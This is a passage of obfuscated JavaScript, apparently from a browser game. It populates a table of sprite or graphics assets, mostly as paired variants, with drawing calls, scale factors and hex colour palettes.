			ⵠⲆ[Ⲇ.ⵠΔΔᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⲆᐃⵠⵠᐃΔ(.6 * ᐃ, ⲆΔΔⲆΔ, [ⵠ[453], "#1c4a4a", "#102d2d", "#255756", "#163d3c", "#194544", "#1f5252", "#184141", "#1c4a4a", "#255756", ⵠ[88]]));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⵠΔᐃΔ(ᐃ * .58, ᐃΔᐃⵠΔ, ["#dbce71", ⵠ[193], ⵠ[104]]));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⵠΔᐃΔ(ᐃ * .58, true, [ⵠ[264], "#15543c", ⵠ[381]]));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆⲆΔⲆⵠᐃ(ᐃ * .69, ⵠⵠⲆⲆΔ, ["#717171", "#485252", ⵠ[536], "#65c7cd", "#4aadad", "#358d8b", "#c1e6ea", "#a6dce4"]));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆⲆΔⲆⵠᐃ(.69 * ᐃ, true, [ⵠ[268], "#092121", ⵠ[351], ⵠ[62], "#277a74", "#1f665f", ⵠ[ᐃⲆⲆΔΔⲆᐃ], ⵠ[365]]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠⵠⵠⲆᐃ(1.3 * ᐃ, [ⵠ[446], "#124c34", "#227248", "#ccedd9", "#2d7a55", "#3c9660", "#afddc1", "#bbefd0", ⵠ[446], ⵠ[310]])));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⵠⵠᐃⵠⵠᐃ(ᐃ * 1.5, ["#191919", "#134d35", "#247349", "#afddc1", "#bbefd0", ⵠ[310]])));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔⵠⵠⲆⵠᐃ(1.5 * ᐃ, ["#191919", "#134d35", "#247349", "#cde7d6", "#122d1c", "#e3eee7"])));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠⵠⵠⲆᐃ(ᐃ * 1.3, [ⵠ[339], "#0e3638", ⵠ[115], ⵠ[49], ⵠ[115], "#1d5559", ⵠ[49], "#48a8aa", ⵠ[126], "#56afac"])));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⵠⵠᐃⵠⵠᐃ(1.5 * ᐃ, [ⵠ[339], "#0e3638", ⵠ[115], ⵠ[49], "#48a8aa", "#56afac"])));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔⵠⵠⲆⵠᐃ(ᐃ * 1.5, [ⵠ[339], "#0e3638", ⵠ[115], ⵠ[49], ⵠ[126], "#56afac"])));
			ⵠⲆ[Ⲇ.ΔΔⵠΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⵠΔⲆⵠ(ᐃ * 1, ["#292b2b", "#57aba6", "#80ccca", "#c42333", "#a4dad9", "#3e8294", ⵠ[407], "#57aba6", ⵠ[407]]));
			ⵠⲆ[Ⲇ.ΔΔⵠΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⵠΔⲆⵠ(Ⲇᐃⵠ * ᐃ, ["#050505", "#1d3a38", "#0b514a", ⵠ[377], "#327570", "#1d3a38", ⵠ[407], "#0b514a", "#63afa9"]));
			ⵠⲆ[Ⲇ.ᐃⲆᐃᐃΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆᐃᐃΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⵠΔᐃᐃⲆⲆ(ᐃ * 1, ["#292b2b", "#a4dad9", "#1f3f3f", "#c1233b"]));
			ⵠⲆ[Ⲇ.ᐃⲆᐃᐃΔⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⵠΔᐃᐃⲆⲆ(ΔᐃᐃⲆ * ᐃ, ["#050505", "#327570", "#021724", ⵠ[377]]));
			ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔΔⵠⲆ(ᐃ * ᐃᐃⵠ, ["#292b2b", "#a4dad9", "#1f3f3f", "#c1233b"]));
			ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔΔⵠⲆ(ᐃ * 1, ["#050505", "#327570", "#021724", ⵠ[377]]));
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆΔⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆΔⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆΔⲆ][Ⲇ.ⲆⵠΔ] = [ⲆΔ.ᐃΔⵠⵠⲆΔⵠ, ⲆΔ.ΔⵠⲆΔⲆⲆΔ, ⲆΔ.ⲆΔᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠᐃⵠᐃᐃΔ, ⲆΔ.ⲆᐃⲆⲆΔⲆᐃ, ⲆΔ.ⵠⲆᐃΔⵠⲆΔ, ⲆΔ.ΔΔⲆⵠⵠⲆΔ, ⲆΔ.ⵠⲆᐃΔΔⲆⵠ, ⲆΔ.ᐃᐃΔⲆᐃΔᐃ, ⲆΔ.ⲆΔᐃΔⵠΔⵠ, ⲆΔ.ⲆⵠⲆⲆᐃᐃᐃ, ⲆΔ.ΔᐃᐃᐃⲆⵠⵠ, ⲆΔ.ᐃᐃⵠⵠⲆΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠⵠⵠ, ⲆΔ.ΔΔⵠⵠᐃᐃⵠ, ⲆΔ.ᐃⵠᐃΔΔᐃⲆ, ⲆΔ.ⵠᐃⲆⲆⵠᐃΔ, ⲆΔ.ⵠⲆΔΔⲆⲆⲆ, ⲆΔ.ⵠᐃΔⲆᐃᐃⲆ, ⲆΔ.ⲆᐃⵠᐃΔⵠᐃ, ⲆΔ.ⵠⲆⲆⵠΔᐃΔ, ⲆΔ.ΔᐃⲆⵠⵠΔⲆ, ⲆΔ.ΔⵠΔⵠΔᐃⵠ, ⲆΔ.ⲆⲆᐃᐃⵠᐃΔ, ⲆΔ.ᐃⵠΔΔⲆⲆΔ, ⲆΔ.Ⲇᐃᐃⵠⵠᐃᐃ, ⲆΔ.ΔⵠⲆΔⵠᐃⲆ, ⲆΔ.ᐃΔⲆΔⲆΔΔ, ⲆΔ.ΔⵠⲆΔᐃⲆⵠ, ⲆΔ.ⲆⵠΔⵠΔΔⲆ, ⲆΔ.ⵠΔᐃᐃⲆΔⲆ, ⲆΔ.ᐃΔⲆⲆᐃⲆᐃ, ⲆΔ.ΔΔΔᐃΔᐃΔ, ⲆΔ.ᐃᐃⵠΔᐃⲆΔ, ⲆΔ.ᐃⲆᐃⲆΔⵠΔ, ⲆΔ.ⲆⲆⲆΔᐃΔⵠ, ⲆΔ.ⲆⲆⵠᐃᐃΔΔ, ⲆΔ.ᐃⲆⵠᐃⵠⵠⵠ, ⲆΔ.ⲆⲆΔΔΔᐃⵠ, ⲆΔ.ⲆⵠⲆⵠᐃΔᐃ, ⲆΔ.ᐃⵠᐃⲆⵠΔΔ, ⲆΔ.ΔⲆⵠⵠⲆⵠⲆ, ⲆΔ.ⲆⲆᐃᐃᐃᐃᐃ, ⲆΔ.ⲆⵠᐃⵠⲆᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃⲆᐃ, ⲆΔ.ⵠⵠΔⵠⲆⵠⲆ, ⲆΔ.ⲆΔⵠΔⵠᐃⲆ, ⲆΔ.ΔᐃⵠⵠᐃⵠΔ, ⲆΔ.ⵠⵠⲆⲆⲆⵠᐃ, ⲆΔ.ⵠⲆΔⵠⵠΔΔ, ⲆΔ.ⵠᐃⲆⵠΔΔⲆ, ⲆΔ.ⲆᐃᐃΔᐃⲆΔ, ⲆΔ.ᐃⵠⲆⵠⵠᐃⲆ, ⲆΔ.ⲆᐃⵠΔⲆᐃⲆ, ⲆΔ.ⲆⵠΔᐃⵠⵠⲆ, ⲆΔ.ΔΔΔⵠⲆⲆⵠ];
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆΔⲆ][Ⲇ.ΔⲆΔ] = [ⲆΔ.ΔΔⵠΔᐃΔΔ, ⲆΔ.ΔⵠᐃⲆᐃΔΔ, ⲆΔ.ⲆΔΔⵠⵠᐃⵠ, ⲆΔ.ⲆⲆΔᐃᐃΔⲆ, ⲆΔ.ΔⲆⵠⲆⵠΔΔ, ⲆΔ.ΔΔᐃᐃⲆΔⵠ, ⲆΔ.ΔΔⵠⲆᐃᐃⵠ, ⲆΔ.ΔⲆΔΔⲆᐃⵠ, ⲆΔ.ⵠᐃᐃᐃΔⵠⵠ, ⲆΔ.ΔⲆΔᐃⲆᐃⵠ, ⲆΔ.ⲆᐃⲆᐃⲆⲆⲆ, ⲆΔ.Δᐃⵠᐃⵠᐃᐃ, ⲆΔ.ΔΔⲆⲆⵠᐃᐃ, ⲆΔ.ΔⲆⲆⵠⵠⵠΔ, ⲆΔ.ᐃᐃᐃΔⵠⵠⵠ, ⲆΔ.ᐃΔᐃᐃΔᐃⲆ, ⲆΔ.ⲆⵠⲆⵠΔΔᐃ, ⲆΔ.ⵠⲆⵠⵠⵠⵠΔ, ⲆΔ.ⲆⲆⵠⵠⵠᐃⲆ, ⲆΔ.ΔⵠᐃⲆᐃᐃΔ, ⲆΔ.ΔΔⲆⵠⲆᐃⲆ, ⲆΔ.ΔⲆⲆᐃΔⲆⵠ, ⲆΔ.ⵠⵠᐃⲆΔᐃⲆ, ⲆΔ.ⵠⵠⵠᐃⲆᐃΔ, ⲆΔ.ⵠᐃⵠⲆⲆᐃᐃ, ⲆΔ.ⲆⲆᐃᐃΔⵠⲆ, ⲆΔ.ⲆᐃⵠⲆΔⵠⲆ, ⲆΔ.ⲆⲆⲆΔᐃⵠᐃ, ⲆΔ.ⵠⲆᐃⲆⲆᐃᐃ, ⲆΔ.ⵠᐃⲆⵠᐃⵠⲆ, ⲆΔ.ⵠⲆᐃᐃⲆᐃΔ, ⲆΔ.ᐃΔΔⵠⲆⲆᐃ, ⲆΔ.ᐃⲆⵠᐃⲆᐃᐃ, ⲆΔ.ⲆⵠⵠΔⲆΔⵠ, ⲆΔ.ΔᐃⵠΔᐃⵠΔ, ⲆΔ.ᐃⵠⵠⲆᐃⲆᐃ, ⲆΔ.ΔⵠⲆᐃᐃᐃⲆ, ⲆΔ.ⵠᐃΔⵠⲆΔᐃ, ⲆΔ.ΔⲆⲆΔⵠᐃⲆ, ⲆΔ.ΔΔΔΔⵠΔⵠ, ⲆΔ.ᐃΔᐃΔΔᐃᐃ, ⲆΔ.ᐃⵠᐃΔΔΔᐃ, ⲆΔ.ⵠⲆⵠⲆΔᐃΔ, ⲆΔ.ΔⵠⵠⵠΔⵠᐃ, ⲆΔ.ΔⲆⵠⵠΔⵠⵠ, ⲆΔ.ⲆΔⵠⵠⲆΔΔ, ⲆΔ.ⵠᐃᐃΔⵠᐃⵠ, ⲆΔ.ΔⵠᐃⲆΔᐃᐃ, ⲆΔ.ᐃΔⲆᐃΔⲆΔ, ⲆΔ.ᐃⲆⲆⲆⲆᐃᐃ, ⲆΔ.ⵠᐃⲆΔΔΔⲆ, ⲆΔ.ᐃᐃᐃᐃⵠΔΔ, ⲆΔ.ⲆᐃⲆΔᐃⵠⲆ, ⲆΔ.ᐃΔⲆⲆᐃⵠᐃ, ⲆΔ.ΔⲆⲆⲆⵠⵠᐃ, ⲆΔ.ⵠᐃΔᐃΔᐃΔ];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃ * 1.1, ⵠΔⲆⲆⲆ, [ⵠ[224], ⵠ[394], ⵠ[353]], 0)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(.9 * ᐃ, ΔⵠΔⲆΔ, [ⵠ[224], ⵠ[394], ⵠ[353]], 1)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃⲆᐃ * ᐃ, false, [ⵠ[224], ⵠ[394], ⵠ[353]], 2)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(.9 * ᐃ, ᐃᐃⵠΔⵠ, [ⵠ[224], ⵠ[394], ⵠ[353]], Δⵠⵠⵠ)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(1.1 * ᐃ, ⵠᐃⵠᐃᐃ, [ⵠ[453], ⵠ[351], ⵠ[268]], 0)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃ * .9, ⲆⲆᐃⵠᐃ, [ⵠ[453], ⵠ[351], ⵠ[268]], ΔΔΔ)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ΔⵠⲆΔ * ᐃ, false, [ⵠ[453], ⵠ[351], ⵠ[268]], 2)));
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(.9 * ᐃ, ᐃⵠΔⵠⲆ, [ⵠ[453], ⵠ[351], ⵠ[268]], 2)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(1.1 * ᐃ, ΔΔⲆⲆΔ, [ⵠ[224], ⵠ[28], ⵠ[51]], 2)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(.9 * ᐃ, ⲆⲆΔⲆⲆ, [ⵠ[224], ⵠ[28], ⵠ[51]], ⵠΔᐃᐃⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃ * ΔᐃⲆⵠ, true, [ⵠ[224], ⵠ[28], ⵠ[51]], 2)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃ * .9, ΔᐃⲆⵠⵠ, [ⵠ[224], ⵠ[28], ⵠ[51]], ⵠΔᐃᐃⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(1.1 * ᐃ, true, [ⵠ[453], ⵠ[351], ⵠ[268]], Δᐃⵠⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃ * .9, ᐃⲆᐃᐃⲆ, [ⵠ[453], ⵠ[351], ⵠ[268]], Ⲇᐃᐃⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(ᐃ * ΔᐃⲆⵠ, true, [ⵠ[453], ⵠ[351], ⵠ[268]], ΔⲆΔΔΔ)));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠⲆΔΔ(.9 * ᐃ, ᐃᐃⲆᐃᐃ, [ⵠ[453], ⵠ[351], ⵠ[268]], ⲆΔΔⵠ)));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(1.5 * ᐃ, ᐃᐃⵠΔⵠ, [ⵠ[321], ⵠ[415], ⵠ[493]])));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(1.3 * ᐃ, false, [ⵠ[321], ⵠ[415], ⵠ[493]])));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(ᐃ * 1.1, ΔⵠΔⲆΔ, [ⵠ[321], ⵠ[415], ⵠ[493]])));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(ᐃ * 1.5, ΔⵠΔⲆΔ, [ⵠ[126], "#3e8989", "#50a09c"])));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(ᐃ * 1.3, false, [ⵠ[126], "#3e8989", "#50a09c"])));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(ᐃ * 1.1, false, [ⵠ[126], "#3e8989", "#50a09c"])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(1.1 * ᐃ, ⵠᐃⵠᐃᐃ, [ⵠ[343], "#70e0dd", "#95efea"])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(ᐃ * .9, false, [ⵠ[343], "#70e0dd", "#95efea"])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(.7 * ᐃ, false, [ⵠ[343], "#70e0dd", "#95efea"])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(1.1 * ᐃ, ⲆⵠΔⵠΔ, [ⵠ[343], "#47b2ac", ⵠ[305]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(ᐃ * .9, false, [ⵠ[343], "#47b2ac", ⵠ[305]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(ᐃ * .7, false, [ⵠ[343], "#47b2ac", ⵠ[305]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠΔᐃΔΔⲆ(ᐃ * 1.7, true, [ⵠ[341], ⵠ[ⲆⵠΔⵠⵠ], ⵠ[520]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠΔᐃΔΔⲆ(ᐃ * 1.5, true, [ⵠ[341], ⵠ[ᐃᐃᐃᐃⲆ], ⵠ[520]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠΔᐃΔΔⲆ(ᐃ * 1.3, ⵠⵠⲆⲆΔ, [ⵠ[341], ⵠ[18], ⵠ[520]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠΔᐃΔΔⲆ(ᐃ * 1.7, ΔΔⲆⲆΔ, [ⵠ[341], "#41aaa0", ⵠ[305]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠΔᐃΔΔⲆ(ᐃ * 1.5, true, [ⵠ[341], "#41aaa0", ⵠ[305]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠΔᐃΔΔⲆ(ᐃ * 1.3, true, [ⵠ[341], "#41aaa0", ⵠ[305]])));
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠᐃᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠᐃᐃⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠᐃᐃⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠᐃᐃⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⵠΔᐃΔⲆⵠ(ᐃ, ["#2d53c4"])));
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠᐃᐃⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⵠΔᐃΔⲆⵠ(ᐃ, ["#2d53c4"])));
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆΔⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆΔⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆΔⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⵠΔᐃΔⲆⵠ(ᐃ, ["#c4912d"])));
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆΔⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⵠΔᐃΔⲆⵠ(ᐃ, ["#c4912d"])));
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#414040"]));
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#153635"]));
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃⲆᐃΔᐃ(ᐃ * ΔΔᐃⵠ, ⲆⲆⲆᐃⵠ, [ⵠ[560], ⵠ[560], ⵠ[338], ⵠ[338], ⵠ[560], ⵠ[338]]));
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⵠⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃⲆᐃΔᐃ(Ⲇᐃⵠ * ᐃ, ᐃᐃΔᐃΔ, [ⵠ[112], ⵠ[112], ⵠ[559], ⵠ[559], ⵠ[112], ⵠ[559]]));
			ⵠⲆ[Ⲇ.ΔΔⵠⲆⵠⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠⲆⵠⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃᐃⵠ * ᐃ, false, [ⵠ[560], ⵠ[560], ⵠ[338], ⵠ[338], ⵠ[560], ⵠ[338]]));
			ⵠⲆ[Ⲇ.ΔΔⵠⲆⵠⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ⵠΔⲆ * ᐃ, false, [ⵠ[112], ⵠ[112], ⵠ[559], ⵠ[559], ⵠ[112], ⵠ[559]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * 1, ᐃⵠⵠⲆᐃ, [ⵠ[560], ⵠ[560], ⵠ[338], ⵠ[338], ⵠ[560], ⵠ[338]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃᐃⲆΔ * ᐃ, false, [ⵠ[112], ⵠ[112], ⵠ[559], ⵠ[559], ⵠ[112], ⵠ[559]]));
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⲆᐃⵠⵠ(ᐃ * Ⲇᐃⵠ, false, [ⵠ[560], ⵠ[560], ⵠ[338], ⵠ[338], ⵠ[560], ⵠ[338]]));
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⲆᐃⵠⵠ(ᐃ * 1, ΔⵠΔⲆΔ, [ⵠ[112], ⵠ[112], ⵠ[559], ⵠ[559], ⵠ[112], ⵠ[559]]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆᐃⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⲆⲆⲆ(ΔⲆⵠ * ᐃ, false, [ⵠ[560], ⵠ[560], ⵠ[338], ⵠ[338], ⵠ[560], ⵠ[338]]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆᐃⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⲆⲆⲆ(ΔᐃᐃⲆ * ᐃ, ᐃᐃΔᐃΔ, [ⵠ[112], ⵠ[112], ⵠ[559], ⵠ[559], ⵠ[112], ⵠ[559]]));
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠ] = [];
